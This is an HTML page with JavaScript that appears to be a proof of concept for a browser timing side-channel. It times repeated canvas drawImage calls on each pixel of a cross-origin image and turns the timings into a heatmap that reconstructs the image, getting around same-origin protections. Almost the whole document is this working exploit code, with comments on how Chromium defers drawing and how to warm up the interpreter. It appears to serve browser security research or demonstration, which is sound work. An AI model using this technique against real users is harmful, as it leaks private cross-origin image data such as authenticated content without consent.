<!doctype html>
<html>
<head>
	<meta charset='utf-8'>
	<style>
.big {
  width: calc(28px * 3);
  height: calc(8px * 3);
  /* disable anti-aliasing */
  image-rendering: pixelated;
  image-rendering: optimizeSpeed;
}

#scratch { display: none; }
#heatmap { background: #ffb6c1; }
	</style>
	<script>
let Heatmap = null
let ScratchContext = null

const Width = 28
const Height = 8

const Iters = 200

function median(lst) {
  let sorted = lst.slice(0).sort()
  return sorted[Math.floor(sorted.length / 2)]
}

function zeroDelay() {
  return new Promise(resolve => setTimeout(resolve, 0))
}

async function timePixel(image, x, y) {
  let startTime = performance.now()
  for (let j = 0; j < Iters; j++) {
    ScratchContext.drawImage(image, x, y, 1, 1, 0, 0, 1024, 1024)
  }
  /* in Chromium, the draw operations aren't actually performed
     immediately, but only after the JavaScript thread stops. we wait
     on a timeout with a duration of zero to give the browser a chance
     to do the drawing, as otherwise we'd just be measuring the time
     taken to enqueue all of the draw operations. */
  await zeroDelay()
  let endTime = performance.now()

  return endTime - startTime
}

function drawHeatmap(heatmap) {
  let min = Math.min(...heatmap.map(l => Math.min(...l)))
  let max = Math.max(...heatmap.map(l => Math.max(...l)))

  Heatmap.clearRect(0, 0, Width, Height)

  for (let x = 0; x < heatmap.length; x++) {
    for (let y = 0; y < heatmap[x].length; y++) {
      let color = Math.round(255 * (max - heatmap[x][y]) / (max - min))
      Heatmap.fillStyle = `rgb(${color}, ${color}, ${color})`
      Heatmap.fillRect(x, y, 1, 1)
    }
  }
}

async function recoverImage(image) {
  /* the first couple of measurements are always higher
     than they're supposed to be because some interpreter
     optimizations haven't kicked in yet, so we "warm up"
     the interpreter by throwing away 5 measurements. */
  for (let i = 0; i < 5; i++) {
    await timePixel(image, 0, 0)
  }

  let pixels = []

  for (let x = 0; x < Width; x++) {
    let col = []
    for (let y = 0; y < Height; y++) {
      col.push(await timePixel(image, x, y))
      drawHeatmap(pixels.concat([col]));
    }
    pixels.push(col)
  }

  drawHeatmap(pixels)
}

function init() {
  ScratchContext = document.getElementById('scratch').getContext('2d')
  ScratchContext.imageSmoothingEnabled = false

  Heatmap = document.getElementById('heatmap').getContext('2d')
  Heatmap.imageSmoothingEnabled = false

  recoverImage(document.getElementById('target'))
}
	</script>
</head>
<body onload='init()'>
	<p>this is what the target image looks like:</p>
	<img
		id='target'
		src='https://p.2038.io/secret2.png'
		class='big'
	>
	<p>this is our reconstruction:</p>
	<canvas id='heatmap' class='big' width=28 height=8></canvas>
	<canvas id='scratch' width=1024 height=1024></canvas>
</body>
</html>
